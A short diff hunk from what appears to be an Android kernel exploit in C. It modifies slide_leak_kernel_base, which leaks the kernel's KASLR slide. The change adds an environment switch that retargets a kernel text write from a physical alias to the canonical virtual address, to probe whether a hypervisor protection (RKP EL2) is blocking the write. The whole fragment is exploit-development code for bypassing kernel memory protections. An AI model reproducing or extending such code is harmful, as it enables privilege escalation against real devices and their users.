@@ -2899,7 +2899,14 @@ int slide_leak_kernel_base(void) {
     }
     return slide_leak_virtual_base((uintptr_t)value);
 #else
-    return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
+    /* SLIDE_CANONICAL=1: use kernel VA (canonical) instead of physical alias
+     * for the write target. Tests whether physical-alias protection (RKP EL2)
+     * is blocking the write vs. the kernel VA being writable through stage-1. */
+    const char *canonical_arg = getenv("SLIDE_CANONICAL");
+    const char *forced_source =
+        (canonical_arg && *canonical_arg && strcmp(canonical_arg, "0") != 0)
+        ? "tracefs" : "forced";
+    return slide_commit_stext(KIMAGE_TEXT_BASE + value, forced_source);
 #endif
   }
   const char *slide_source = getenv("SLIDE_SOURCE");
